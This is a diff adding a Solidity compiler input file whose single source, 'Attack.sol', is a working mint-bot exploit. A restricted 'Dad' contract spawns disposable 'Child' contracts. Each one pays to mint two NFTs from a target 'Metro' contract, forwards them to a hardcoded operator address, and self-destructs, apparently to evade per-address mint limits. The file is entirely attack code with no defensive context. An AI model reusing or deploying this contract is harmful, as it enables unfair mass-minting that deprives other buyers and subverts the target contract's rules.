@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "contracts/Attack.sol": {
+      "content": "// SPDX-License-Identifier: MIT LICENSE\r\npragma solidity 0.8.4;\r\n\r\ninterface Metro {\r\n    function mintNFT(uint256 amount, bool stake) external payable;\r\n    function totalSupply() external returns (uint);\r\n    function safeTransferFrom(address from, address to, uint256 tokenId) external;\r\n}\r\n\r\n// address SHRYDER = 0x4642D9D9A434134CB005222eA1422e1820508d7B;\r\ncontract Child {\r\n    constructor (address nft_address, address payable shryder, uint totalSupply) payable {\r\n        Metro(nft_address).mintNFT{value: 0.2 ether}(2, false);\r\n\r\n        Metro(nft_address).safeTransferFrom(address(this), shryder, totalSupply);\r\n        Metro(nft_address).safeTransferFrom(address(this), shryder, totalSupply + 1);\r\n\r\n        selfdestruct(shryder);\r\n    }\r\n}\r\n\r\ncontract Dad {\r\n    function lol (uint amount, address nft_address) external payable {\r\n        require(msg.sender == 0x4642D9D9A434134CB005222eA1422e1820508d7B);\r\n\r\n        uint totalSupply = Metro(nft_address).totalSupply() + 1;\r\n        for (uint i = 0; i < amount; i++) {\r\n            new Child{value: 0.2 ether}(nft_address, payable(msg.sender), totalSupply);\r\n            totalSupply += 2;\r\n        }\r\n    }\r\n}"
+    }
+  }
+}
